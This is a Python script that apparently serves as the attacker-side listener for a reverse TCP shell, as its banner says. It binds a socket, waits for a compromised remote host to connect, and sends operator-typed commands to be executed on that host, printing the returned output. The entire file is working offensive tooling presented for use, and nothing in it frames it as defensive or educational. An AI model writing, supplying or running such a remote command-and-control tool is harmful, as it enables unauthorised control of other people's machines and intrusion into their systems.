#!/usr/bin/env python

import socket, argparse
from colorama import init
from termcolor import colored

init()

ap = argparse.ArgumentParser(add_help=False)
ap.add_argument("-h", "--host", required=True, help="host IP")
ap.add_argument("-p", "--port", required=True, help="host Port")
ap.add_argument("-b", "--buffersize", help="buffer size, can be 1024, 2048 ... (if not specified, default value is 1024)")
ap.add_argument("-max", "--maxconnections", help="number of maximum connections (if not specified, default value is 1)")
try:
    args = vars(ap.parse_args())
except:
    print("\n| ___ \                             |_   _/  __ \| ___ \ \n| |_/ /_____   _____ _ __ ___  ___    | | | /  \/| |_/ / \n|    // _ \ \ / / _ \ '__/ __|/ _ \   | | | |    |  __/  \n| |\ \  __/\ V /  __/ |  \__ \  __/   | | | \__/\| |     \n\_| \_\___| \_/ \___|_|  |___/\___|   \_/  \____/\_|     \n")
    print(colored("$> A simple python reverse TCP shell (output only !)\n$> Author: An0nY\n", "green"))
    print("Parameters:\n", colored("RED", "red"), "Means this parameter is required !\n", colored("YELLOW", "yellow"), "Means this parameter is optional !\n", "\n", colored("    -h", "red"), "Host IP address\n", colored("    -p", "red"), "Host Port number. Use TCP ports such as 80, 443, 8080 ...\n", colored("    -b", "yellow"), "Buffer size to use. 1024 ~ 1kb, 2048 ~ 2kb. Default is 1024\n", colored("    -max", "yellow"), "Maximum number of reverse TCP connections to accept. Default is 1\n")
    exit()


print("\n| ___ \                             |_   _/  __ \| ___ \ \n| |_/ /_____   _____ _ __ ___  ___    | | | /  \/| |_/ / \n|    // _ \ \ / / _ \ '__/ __|/ _ \   | | | |    |  __/  \n| |\ \  __/\ V /  __/ |  \__ \  __/   | | | \__/\| |     \n\_| \_\___| \_/ \___|_|  |___/\___|   \_/  \____/\_|     \n")
print(colored("$> A simple python reverse TCP shell (output only !)\n$> Author: An0nY\n", "green"))
print(colored("\n[INIT]", "yellow") , "Initializing parameters ...")

host = args["host"]
print(colored("[INIT]", "green") , "Host initialized successfully ...")
try:
    port = int(args["port"])
except:
    print(colored("[CRITICAL]", "red") , "Please enter a valid port !\nQuitting ...\n")
    exit()
print(colored("[INIT]", "green") , "Port initialized successfully ...")

if args["buffersize"] != None:
    try:
        buff_size = int(args["buffersize"])
    except:
        print(colored("[CRITICAL]", "red") , "Please enter a valid buffer size !\nQuitting ...\n")
        exit()
if args["buffersize"] == None:
    buff_size = 1024
print(colored("[INIT]", "green") , "Buffer size initialized successfully ...")

if args["maxconnections"] != None:
    try:
        max_conns = int(args["maxconnections"])
    except:
        print(colored("[CRITICAL]", "red") , "Please enter a valid maximum number of connections !\nQuitting ...\n")
        exit()
if args["maxconnections"] == None:
    max_conns = 1
print(colored("[INIT]", "green") , "Maximum number of connections initialized successfully ...")

print(colored("[SUCCESS]", "green") , "Initialization successful !\n")
print(colored("[PROCESS]", "green") , "Creating and binding socket ...")

s = socket.socket()
try:
    s.bind((host, port))
except:
    print(colored("[CRITICAL]", "red") , "Could not bind socket to host and port !\nQuitting ...\n")
    exit()
print(colored("[SUCCESS]", "green") , "Socket created and bound successfully !\n")

s.listen(max_conns)
print(colored("[PROCESS]", "yellow") , "Listening as server %s on port %s ..." % (host, str(port)))

conn, addr = s.accept()
print(colored("[SUCCESS]", "green") , "Received remote TCP connection from %s : %s ..." % (str(conn), str(addr)))
print(colored("[SUCCESS]", "green") , "Enter commands to be executed on remote host now ...\n")

while True:
    cmd = str(input("&> "))
    conn.send(cmd.encode("UTF-8"))
    if cmd.lower() == "exit" or cmd.lower() == "quit":
        print(colored("[PROCESS]", "yellow") , "Exit or Quit command detected, exiting remote TCP connection ...")
        break
    print(conn.recv(buff_size).decode("UTF-8"))
s.close()
print(colored("[SUCCESS]", "green") , "Socket closed, quitting ...")